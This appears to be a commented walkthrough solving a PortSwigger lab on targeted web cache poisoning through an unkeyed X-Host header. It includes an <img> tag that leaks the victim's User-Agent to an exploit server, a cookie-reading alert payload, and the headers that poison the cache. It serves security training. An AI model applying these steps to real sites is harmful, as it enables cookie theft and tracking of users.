// The steps below are meant to solve the following lab:
// https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-targeted-using-an-unknown-header

// Using param miner on the websites main page will show the following:
// Identified parameter on [SUB_DOMAIN].h1-web-security-academy.net: x-host

// Using the header "X-Host: example.com" we'll see that "example.com" is reflected in the response.
// <script type="text/javascript" src="//example.com/resources/js/tracking.js">

// We can also see the following header in the response:
// Vary: User-Agent

// In order to find the targets user agent we can leave the following comment on a blog post:
// <img src="https://[SUB_DOMAIN].exploit-server.net/exploit">

// Next we can check the user agent in our exploit servers traffic logs.

// After we've gotten the targets user agent we can change the exploit path to "/resources/js/tracking.js  and add the following JavaScript to alert the targets cookie:
alert(document.cookie)

// Now we can send the following headers to poison the cache:

// User-Agent: [TARGET_USER_AGENT]
// X-Host: [SUB_DOMAIN].exploit-server.net
